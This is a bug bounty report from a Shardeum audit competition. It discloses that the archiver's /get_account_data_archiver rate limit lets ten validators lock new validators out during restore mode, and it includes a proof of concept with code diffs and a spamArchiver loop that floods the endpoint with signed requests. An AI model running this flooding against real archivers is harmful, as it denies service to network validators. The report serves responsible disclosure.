# #39814 \[W\&A-Low] Prevent new validators from joining the network by a DOS of the archiver

**Submitted on Feb 8th 2025 at 03:37:15 UTC by @Franfran for** [**Audit Comp | Shardeum: Ancillaries III**](https://immunefi.com/audit-competition/audit-comp-shardeum-ancillaries-iii)

* **Report ID:** #39814
* **Report Type:** Websites and Applications
* **Report severity:** Low
* **Target:** <https://github.com/shardeum/archive-server/tree/itn4>
* **Impacts:**
  * Taking down the application/website
  * Temporarily disabling user to access target site, such as:
* Locking up the victim from login
* Cookie bombing, etc.
  * RPC API crash affecting projects with greater than or equal to 25% of the market capitalization on top of the respective layer

## Description

## Brief/Intro

The `/get_account_data_archiver` endpoint exposed by public archivers can be taken down by a couple of validators (10 to be exact). This is crucial for syncing to the network and will prevent validators from participating in the network in `restore` mode.

## Vulnerability Details

The primary reason of this issue is because of the following coding mistake in the function [`validateAccountDataRequest` function](https://github.com/shardeum/archiver/blob/5472ab4027dc1ff7302ca19f998570c1a4cc6706/src/Data/AccountDataProvider.ts#L99-L104):

```typescript
if (!NodeList.byPublicKey.has(nodePublicKey)) {  
  return { success: false, error: 'This node is not found in the nodelist!' }  
}  
if (!servingValidators.has(nodePublicKey) && servingValidators.size >= config.maxValidatorsToServe) {  
  return {  
    success: false,  
    error: 'Archiver is busy serving other validators at the moment!',  
  }  
}  
if (accountStart.length !== 64 || accountEnd.length !== 64 || accountStart > accountEnd) {  
  return { success: false, error: 'Invalid account range' }  
}
```

If a validator makes a successful request to the `/get_account_data_archiver` endpoint, it will be included in the `servingValidators` map. This seems to be a kind of rate-limiting strategy because this endpoint may be quite expensive to respond to for the archiver. The issue is that while the account gets correctly added to this map, it is implicitly whitelisted forever given that it keeps spamming this endpoint, since it is already in the `servingValidators` map and that [the last queried time will be overwritten every time](https://github.com/shardeum/archiver/blob/5472ab4027dc1ff7302ca19f998570c1a4cc6706/src/Data/AccountDataProvider.ts#L123): Making this DOS attack easy to carry and predictable because it doesn't require to hammer endpoints.

```typescript
if (!Crypto.verify(payload)) {  
  return { success: false, error: 'Invalid signature' }  
}  
servingValidators.set(nodePublicKey, Date.now())  
return { success: true }
```

So if the validator calls this endpoint frequently enough, it will never be [cleared from the map](https://github.com/shardeum/archiver/blob/5472ab4027dc1ff7302ca19f998570c1a4cc6706/src/Data/AccountDataProvider.ts#L296-L300):\
Finally, if the amount of validators being in this map exceeds the `maxValidatorsToServe` (which is 10 by default), any new validator will be denied with the error response `"Archiver is busy serving other validators at the moment!"`.

## Impact Details

Because no other validator can call the `/get_account_data_archiver` endpoint, nodes which are just firing up will be prevented from syncing to the network if the network is in `restore` mode.\
To understand why, let's walk backwards the call to this endpoint in the [`@shardeum/core`](https://github.com/shardeum/core) repo.

The URL is built [here](https://github.com/shardeum/core/blob/e971830080afe86922ee829f09ebbe0ac1618ccb/src/state-manager/ArchiverSyncTracker.ts#L550).\
Then, it is used to call the [`getAccountDataFromArchiver` function](https://github.com/shardeum/core/blob/e971830080afe86922ee829f09ebbe0ac1618ccb/src/state-manager/ArchiverSyncTracker.ts#L562).\
The call would likely not throw if the archiver is up, but the `success` flag will be set to `false` and will contain the expected error message `Archiver is busy serving other validators at the moment!`. Meaning that we go in [this branch](https://github.com/shardeum/core/blob/e971830080afe86922ee829f09ebbe0ac1618ccb/src/state-manager/ArchiverSyncTracker.ts#L592).\
In the case of the POC, we only have up one archiver so when calling the `retryWithNextArchiver` function, we never go [in the throw branch](https://github.com/shardeum/core/blob/e971830080afe86922ee829f09ebbe0ac1618ccb/src/state-manager/ArchiverSyncTracker.ts#L492) but instead keep calling this function in a loop, which might be undesired behavior since the code seem to mean that it should retry a limited amount of times before failing on a fatal error.

So, if the network is currently in `restore` mode, it only takes `10` validators by default to take down the `/get_account_data_archiver` of every archiver in the network and make the syncing from archivers impossible.

## References

Links attached when applicable.

## Proof of Concept

## Proof of Concept

### Prerequisites

Choose a directory on your system.\
Clone these repos under the same root:

* [shardeum/shardeum](https://github.com/shardeum/shardeum/)
* [shardeum/core](https://github.com/shardeum/core)
* [shardeum/archiver](https://github.com/shardeum/archiver)

#### shardeum/shardeum

```sh
git fetch -a
git checkout dev
```

#### shardeum/core

```sh
git fetch -a
git checkout v2.13.7-prerelease.3
```

### shardeum/archiver

```sh
git fetch -a
git checkout v3.5.9-prerelease.1
```

> For each repo, install their dependencies and follow their prerequisites (compilation).

### Diffs

#### shardeum/shardeum

```diff
diff --git a/debug-10-nodes.config.json b/debug-10-nodes.config.json
index 3410486e..97c5dbc2 100644
--- a/debug-10-nodes.config.json
+++ b/debug-10-nodes.config.json
@@ -1,15 +1,15 @@
 {
   "server": {
     "p2p": {
-      "baselineNodes": 10,
-      "minNodes": 10,
+      "baselineNodes": 3,
+      "minNodes": 3,
       "maxNodes": 1280,
       "forceBogonFilteringOn": false,
       "syncFloorEnabled": true,
       "syncingDesiredMinCount": 5,
       "activeRecoveryEnabled": true,
       "flexibleRotationDelta": 0,
-      "formingNodesPerCycle": 9
+      "formingNodesPerCycle": 1
     },
     "sharding": {
       "nodesPerConsensusGroup": 10
```

```diff
diff --git a/package.json b/package.json
index 6d38cb91..5cfd0c95 100644
--- a/package.json
+++ b/package.json
@@ -39,7 +39,7 @@
   "author": "",
   "dependencies": {
     "@shardeum-foundation/lib-archiver-discovery": "1.1.1",
-    "@shardeum-foundation/core": "2.13.7-prerelease.3",
+    "@shardeum-foundation/core": "../core/",
     "@shardeum-foundation/lib-crypto-utils": "4.1.7",
     "@shardeum-foundation/lib-net": "1.4.2",
     "@shardeum-foundation/lib-types": "1.2.23",
@@ -70,7 +70,7 @@
     "sqlite3": "5.1.6"
   },
   "devDependencies": {
-    "@shardeum-foundation/archiver": "3.5.9-prerelease.1",
+    "@shardeum-foundation/archiver": "../archiver",
     "@shardeum-foundation/monitor-server": "2.8.8",
     "@shardeum-foundation/tools-shardus-cli": "4.3.2",
     "@types/decimal.js": "7.4.0",
```

#### shardeum/core

Make sure that the network starts and stays in `restore` mode.

```diff
diff --git a/src/p2p/Modes.ts b/src/p2p/Modes.ts
index d1a5634e..e8d41c1e 100644
--- a/src/p2p/Modes.ts
+++ b/src/p2p/Modes.ts
@@ -12,7 +12,8 @@ import { logFlags } from '../logger'
 /** STATE */
 
 let p2pLogger: Logger
-export let networkMode: P2P.ModesTypes.Record['mode'] = 'forming'
+// export let networkMode: P2P.ModesTypes.Record['mode'] = 'forming'
+export let networkMode: P2P.ModesTypes.Record['mode'] = 'restore'
 
 /** ROUTES */
 /*
@@ -108,64 +109,66 @@ export function updateRecord(
     return
   }
 
+  record.mode = 'restore';
+
   if (prev) {
-    //  if the modules have just been swapped last cycle
-    if (prev.mode === undefined && prev.safetyMode !== undefined) {
-      if (hasAlreadyEnteredProcessing === false) {
-        record.mode = 'forming'
-      } else if (enterProcessing(active)) {
-        record.mode = 'processing'
-      } else if (enterSafety(active)) {
-        record.mode = 'safety'
-      } else if (enterRecovery(active)) {
-        record.mode = 'recovery'
-      }
-      // for all other cases
-    } else {
-      record.mode = prev.mode
-
-      if (prev.mode === 'forming') {
-        if (enterProcessing(active)) {
-          record.mode = 'processing'
-        }
-      } else if (prev.mode === 'processing') {
-        if (enterShutdown(active)) {
-          record.mode = 'shutdown'
-      } else if (prev.mode === 'processing') {
-        if (enterShutdown(active)) {
-          record.mode = 'shutdown'
-        } else if (enterRecovery(active)) {
-          record.mode = 'recovery'
-        } else if (enterSafety(active)) {
-          record.mode = 'safety'
-        }
-      } else if (prev.mode === 'safety') {
-        if (enterShutdown(active)) {
-          record.mode = 'shutdown'
-        } else if (enterRecovery(active)) {
-          record.mode = 'recovery'
-        } else if (enterProcessing(active)) {
-          record.mode = 'processing'
-        }
-      } else if (prev.mode === 'recovery') {
-        if (enterShutdown(active)) {
-          record.mode = 'shutdown'
-        } else if (enterRestore(active + prev.syncing)) {
-          record.mode = 'restore'
-        }
-      } else if (prev.mode === 'shutdown' && Self.isFirst) {
-        record.mode = 'restart'
-      } else if (prev.mode === 'restart') {
-        // Use prev.syncing to be sure that new joined nodes in the previous cycle have synced the cycle data before we trigger the `restore` mode to start syncing the state data
-        if (enterRestore(prev.syncing)) {
-          record.mode = 'restore'
-        }
-      } else if (prev.mode === 'restore') {
-        if (enterProcessing(active)) {
-          record.mode = 'processing'
-        }
-      }
-    }
+  //   //  if the modules have just been swapped last cycle
+  //   if (prev.mode === undefined && prev.safetyMode !== undefined) {
+  //     if (hasAlreadyEnteredProcessing === false) {
+  //       record.mode = 'forming'
+  //     } else if (enterProcessing(active)) {
```

#### shardeum/archiver

To make our job easier, disable the rate limit and make it such as the 10 validators would be constantly spamming this endpoint. We will do it separately.

```diff
diff --git a/src/Data/AccountDataProvider.ts b/src/Data/AccountDataProvider.ts
index 8b91083..be88a6d 100644
--- a/src/Data/AccountDataProvider.ts
+++ b/src/Data/AccountDataProvider.ts
@@ -96,32 +96,32 @@ export const validateAccountDataRequest = (
   if (!NodeList.byPublicKey.has(nodePublicKey)) {
     return { success: false, error: 'This node is not found in the nodelist!' }
   }
-  if (!servingValidators.has(nodePublicKey) && servingValidators.size >= config.maxValidatorsToServe) {
-    return {
-      success: false,
-      error: 'Archiver is busy serving other validators at the moment!',
-    }
-  }
-  if (accountStart.length !== 64 || accountEnd.length !== 64 || accountStart > accountEnd) {
-    return { success: false, error: 'Invalid account range' }
-  }
-  if (Number.isNaN(tsStart) || tsStart < 0 || tsStart > Date.now()) {
-    return { success: false, error: 'Invalid start timestamp' }
-  }
-  if (Number.isNaN(maxRecords) || maxRecords < 1) {
-    return { success: false, error: 'Invalid max records' }
-  }
-  if (Number.isNaN(offset) || offset < 0) {
-    return { success: false, error: 'Invalid offset' }
+  // if (!servingValidators.has(nodePublicKey) && servingValidators.size >= config.maxValidatorsToServe) {
+  return {
+    success: false,
+    error: 'Archiver is busy serving other validators at the moment!',
   }
-  if (accountOffset && accountOffset.length !== 64) {
-    return { success: false, error: 'Invalid account offset' }
-  }
-  if (!Crypto.verify(payload)) {
-    return { success: false, error: 'Invalid signature' }
-  }
-  servingValidators.set(nodePublicKey, Date.now())
-  return { success: true }
+  // }
+  // if (accountStart.length !== 64 || accountEnd.length !== 64 || accountStart > accountEnd) {
+  //   return { success: false, error: 'Invalid account range' }
+  // }
+  // if (Number.isNaN(tsStart) || tsStart < 0 || tsStart > Date.now()) {
+  //   return { success: false, error: 'Invalid start timestamp' }
+  // }
+  // if (Number.isNaN(maxRecords) || maxRecords < 1) {
+  //   return { success: false, error: 'Invalid max records' }
+  // }
+  // if (Number.isNaN(offset) || offset < 0) {
+  //   return { success: false, error: 'Invalid offset' }
+  // }
+  // if (accountOffset && accountOffset.length !== 64) {
+  //   return { success: false, error: 'Invalid account offset' }
+  // }
+  // if (!Crypto.verify(payload)) {
+  //   return { success: false, error: 'Invalid signature' }
+  // }
+  // servingValidators.set(nodePublicKey, Date.now())
+  // return { success: true }
 }
 
 export const validateAccountDataByListRequest = (
```

### Running the network

```sh
# in shardeum/shardeum
npm i && npm run prepare && npm ci
```

```sh
shardus start 10
```

```sh
shardus list-net
```

> Make sure that your 10 instance are online!

```sh
Checking /home/hqx/shardeum/instances...
┌─────┬────────────────────────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id  │ name                       │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
├─────┼────────────────────────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
│ 0   │ "archive-server-1"         │ default     │ 3.5.9-… │ fork    │ 18420    │ 50s    │ 0    │ online    │ 0%       │ 87.3mb   │ hqx      │ disabled │
│ 1   │ "monitor-server"           │ default     │ 2.8.8   │ fork    │ 18448    │ 48s    │ 0    │ online    │ 0%       │ 166.1mb  │ hqx      │ disabled │
│ 2   │ "shardus-instance-9001"    │ default     │ 1.17.1  │ fork    │ 18470    │ 48s    │ 0    │ online    │ 0%       │ 137.2mb  │ hqx      │ disabled │
│ 3   │ "shardus-instance-9002"    │ default     │ 1.17.1  │ fork    │ 18492    │ 47s    │ 0    │ online    │ 0%       │ 136.3mb  │ hqx      │ disabled │
│ 4   │ "shardus-instance-9003"    │ default     │ 1.17.1  │ fork    │ 18514    │ 46s    │ 0    │ online    │ 0%       │ 136.9mb  │ hqx      │ disabled │
│ 5   │ "shardus-instance-9004"    │ default     │ 1.17.1  │ fork    │ 18538    │ 45s    │ 0    │ online    │ 0%       │ 137.7mb  │ hqx      │ disabled │
│ 6   │ "shardus-instance-9005"    │ default     │ 1.17.1  │ fork    │ 18560    │ 43s    │ 0    │ online    │ 0%       │ 136.1mb  │ hqx      │ disabled │
│ 7   │ "shardus-instance-9006"    │ default     │ 1.17.1  │ fork    │ 18582    │ 42s    │ 0    │ online    │ 0%       │ 136.6mb  │ hqx      │ disabled │
│ 8   │ "shardus-instance-9007"    │ default     │ 1.17.1  │ fork    │ 18604    │ 40s    │ 0    │ online    │ 0%       │ 137.4mb  │ hqx      │ disabled │
│ 9   │ "shardus-instance-9008"    │ default     │ 1.17.1  │ fork    │ 18626    │ 38s    │ 0    │ online    │ 0%       │ 136.8mb  │ hqx      │ disabled │
│ 10  │ "shardus-instance-9009"    │ default     │ 1.17.1  │ fork    │ 18648    │ 37s    │ 0    │ online    │ 0%       │ 136.8mb  │ hqx      │ disabled │
│ 11  │ "shardus-instance-9010"    │ default     │ 1.17.1  │ fork    │ 18670    │ 35s    │ 0    │ online    │ 0%       │ 138.1mb  │ hqx      │ disabled │
└─────┴────────────────────────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘
```

> Check logs and look again until the network started syncing.

```sh
shardus pm2 "logs 2 --lines 100"
```

> Wait about 15 minutes until the syncing process started, check the logs again

You should observe that the logs keep spamming with

```sh
getAccountDataFromArchiver result {
  success: false,
  error: 'Archiver is busy serving other validators at the moment!'
}
```

These logs seem to be never ending, the code loops and the validator will never be able to sync the network.

### DOS of the archiver

Since we know that the attack works while the archiver is in a DOS state, let's now DOS it!

#### shardeum/core

```diff
diff --git a/src/shardus/index.ts b/src/shardus/index.ts
index 47059f7d..86e04ff3 100644
--- a/src/shardus/index.ts
+++ b/src/shardus/index.ts
@@ -93,6 +93,7 @@ import SocketIO from 'socket.io'
 import { nodeListFromStates, queueFinishedSyncingRequest } from '../p2p/Join'
 import * as NodeList from '../p2p/NodeList'
 import { P2P } from '@shardeum-foundation/lib-types'
+import * as http from '../http'
 
 // the following can be removed now since we are not using the old p2p code
 //const P2P = require('../p2p')
@@ -620,6 +621,11 @@ class Shardus extends EventEmitter {
     } catch (e) {
       this.mainLogger.error('Socket connection break', e)
     }
+
+    setInterval(async () => {
+      await this.spamArchiver();
+    }, 1000);
+
     this.network.on('timeout', (node, requestId: string, context: string, route: string) => {
       const ipPort = `${node.internalIp}:${node.internalPort}`
       //this console log is probably redundant but are disabled most of the time anyhow.
@@ -1040,6 +1046,29 @@ class Shardus extends EventEmitter {
     this.setupDebugEndpoints()
   }
 
+  async spamArchiver() {
+    const dataSourceArchiver = {
+      ip: "127.0.0.1",
+      port: 4000
+    };
+    const accountDataArchiverUrl = `http://${dataSourceArchiver.ip}:${dataSourceArchiver.port}/get_account_data_archiver`
+    try {
+      const message = {
+        accountStart: '0000000000000000000000000000000000000000000000000000000000000000',
+        accountEnd: 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
+        tsStart: 0,
+        maxRecords: 200,
+        offset: 0,
+        accountOffset: '0000000000000000000000000000000000000000000000000000000000000000',
+      }
+      const payload = this.crypto.sign(message)
+      const result = await http.post(accountDataArchiverUrl, payload, false, 10000)
+      console.log('getAccountDataFromArchiver result', result)
+    } catch (error) {
+      console.error('getAccountDataFromArchiver error', error)
+    }
+  }
+
   /**
    * Function used to register event listeners
    * @param {*} emitter Socket emitter to be called
```

#### shardeum/archiver

```diff
diff --git a/src/Config.ts b/src/Config.ts
index b172278..2f7af65 100644
--- a/src/Config.ts
+++ b/src/Config.ts
@@ -157,7 +157,7 @@ let config: Config = {
   sendActiveMessage: false,
   globalNetworkAccount:
     process.env.GLOBAL_ACCOUNT || '1000000000000000000000000000000000000000000000000000000000000001', //this address will change in the future
-  maxValidatorsToServe: 10, // max number of validators to serve accounts data during restore mode
+  maxValidatorsToServe: 5, // max number of validators to serve accounts data during restore mode
   limitToArchiversOnly: true,
   verifyReceiptData: true,
   verifyReceiptSignaturesSeparately: true,
```

New validators should not be able to call this endpoint and it will return an error since it's being spammed by the first 5 validators.
